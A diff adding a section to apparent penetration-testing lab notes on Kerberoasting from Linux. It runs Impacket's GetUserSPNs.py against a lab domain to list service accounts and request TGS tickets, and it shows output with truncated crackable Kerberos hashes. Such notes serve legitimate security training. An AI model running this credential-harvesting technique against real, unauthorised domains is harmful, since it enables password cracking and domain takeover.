@@ -525,3 +525,48 @@ The `/tgtdeleg` flag can be useful for you in situations where you find accounts
 
 In cases where you receive the hash of the account with AES encryption, you can use `/tgtdeleg` flag with Rubeus to force RC4 encryption. This may work in some domains where RC4 is built-in as a failsafe for backward compatibility with older services. If successful, you may get a password hash that could crack minutes or even hours faster than if you were trying to crack an AES-encrypted hash.
 
+### Kerberoast from Linux
+
+To perform Kerberoasting from Linux, you will use the [GetUserSPN.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) tool from the Impacket suite. This tool can search for all Kerberoastable accounts, extract the data encrypted with the password of the service account, and return a hashcat-friendly hash for further cracking.
+
+Running `GetUserSPN.py` without parameters will producy similar output to your PowerShell FindSPNAccounts.ps1 script from above.
+
+```bash
+d41y@htb[/htb]$ GetUserSPNs.py inlanefreight.local/pixis
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                     Name        MemberOf                                               PasswordLastSet             LastLogon  Delegation    
+---------------------------------------  ----------  -----------------------------------------------------  --------------------------  ---------  -------------
+MSSQL_svc_dev/inlanefreight.local:1443   sqldev      CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:20.558388  <never>    unconstrained 
+MSSQLSvc/sql01:1433                      sqlprod     CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:27.558399  <never>                  
+MSSQL_svc_qa/inlanefreight.local:1443    sqlqa       CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL    2020-07-27 20:46:33.792787  <never>                  
+MSSQL_svc_test/inlanefreight.local:1443  sql-test                                                           2020-07-27 20:47:07.574105  <never>                  
+IIS_dev/inlanefreight.local:80           adam.jones                                                         2020-07-27 21:35:57.069094  <never>
+```
+
+Now that you know there are Kerberoastable accounts, you can request a TGS ticket or Service ticket for each of them and obtain a crackable hash in hashcat's format with the `-request` argument.
+
+```bash
+d41y@htb[/htb]$ GetUserSPNs.py inlanefreight.local/pixis -request
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                     Name        MemberOf                                               PasswordLastSet             LastLogon  Delegation    
+---------------------------------------  ----------  -----------------------------------------------------  --------------------------  ---------  -------------
+MSSQL_svc_dev/inlanefreight.local:1443   sqldev      CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:20.558388  <never>    unconstrained 
+MSSQLSvc/sql01:1433                      sqlprod     CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2020-07-27 20:46:27.558399  <never>                  
+MSSQL_svc_qa/inlanefreight.local:1443    sqlqa       CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL    2020-07-27 20:46:33.792787  <never>                  
+MSSQL_svc_test/inlanefreight.local:1443  sql-test                                                           2020-07-27 20:47:07.574105  <never>                  
+IIS_dev/inlanefreight.local:80           adam.jones                                                         2020-07-27 21:35:57.069094  <never>                  
+
+
+$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local~1443*$f06349cf7220c21cde1236e53a491a67$c4c2079e9b<SNIP>
+$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01~1433*$577b69c3a2abcff0fc3318fd94f90014$9272d9d177c6147a1b773ba12f95<SNIP>
+$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local~1443*$edaecbbcd610e2dd3ef39d6ea2cb3838$b5dbb92fb35b<SNIP>
+$krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local~1443*$989e43ca34c03490e7de627135599ab4$832a1d7<SNIP>
+$krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local~80*$2b9cfebc5043606bbebb9f140bdf48cb$c05bf3d19a3e26<SNIP>
+```
+
